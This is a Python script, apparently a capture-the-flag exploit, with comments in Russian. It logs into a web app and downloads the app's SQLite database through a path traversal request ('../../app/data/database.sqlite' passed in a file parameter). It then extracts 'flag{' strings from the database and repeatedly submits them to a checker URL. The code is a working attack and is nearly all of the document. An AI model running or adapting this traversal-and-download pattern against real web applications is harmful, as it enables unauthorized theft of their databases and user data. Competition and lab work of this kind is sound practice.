import requests
import sqlite3
import time


from settings import *


# ====== Логинимся =========
def login(login_url):
    session = requests.Session() 

    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Origin': login_url  
    }
    
    
    session.get(login_url, headers=headers)

    with open(LOGIN_FILE) as f:
        email = f.readline().strip()
        password = f.readline().strip()

    login_data = {'email': email, 'password': password}
    session.post(login_url, data=login_data, headers=headers)

    return session

#======== Скачиваем бд ==========
def download_db(session):
    print("Скачивание базы...")
    
    resp = session.get(f"{BASE_URL}/files?file=../../app/data/database.sqlite", timeout=30)
    if resp.status_code == 200:
        with open(DB_PATH, 'wb') as f:
            f.write(resp.content)
        print("База скачана!")
    else:
        raise Exception(f"Ошибка скачивания: {resp.status_code}")

#========== Вытаскиваем флаги из бд =========
def extract_flags_from_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT content FROM posts")  # Только уникальные значения
    rows = cursor.fetchall()
    conn.close()
    
    flags = {row[0] for row in rows if row[0].startswith("flag{")}
    print(f"Найдено {len(flags)} уникальных флагов.")
    return flags

#========== Проверям конкретный флаг =======
def check_flag(flag,session):
    try:
        resp = session.get(CHECK_URL + flag, timeout=10)
        if resp.text.strip() == "Верный флаг":
            print(f"✅ Верный флаг: {flag}")
            return True
        else:
            print(f"❌ Неверный: {flag}")
            return False
    except Exception as e:
        print(f"⚠️ Ошибка при проверке {flag}: {e}")
        return False

#========= Проверяем все флаги ==========
def check_flags(flags, session):
    for flag in flags:
        # если нашли нужный флаг, обрубаем
        if check_flag(flag, session):
            return 1
    return 0

def get_new_flags(all_flags, FLAGS_FILE):
    f = open(FLAGS_FILE, "r+")
    checked_flags = {i.strip() for i in f.readlines()}
    
    new_flags = all_flags.difference(checked_flags)
    # добавляем новые флаги в файл
    for i in new_flags:
        f.write(i+'\n')
    f.close()
    return new_flags

# === Основной поток ===

try:
    while True:
        # логинимся
        session = login(LOGIN_URL)

        # скачиваем бд
        download_db(session)

        # достаем оттуда флаги
        all_flags = extract_flags_from_db()
        
        # достаем только новые флаги, старые уже проверены
        new_flags = get_new_flags(all_flags, FLAGS_FILE)

        print("☠️ Начинаю проверять флаги... ☠️")
        time_start = time.time()
        if check_flags(new_flags, session):
            print("✅ Флаги проверены, найден нужный флаг!")
            
        else:
            print("🧐 Все флаги проверены.")

        time_finish = time.time()

        check_time = (time_finish - time_start)
        
        print(f"Проверка длилась {check_time:.3f} секунд!")
        print(f"😴 Поспим {SLEEP_TIME} секунд ...")
        time.sleep(SLEEP_TIME)
except KeyboardInterrupt:
    print("\nCTRL+C...")
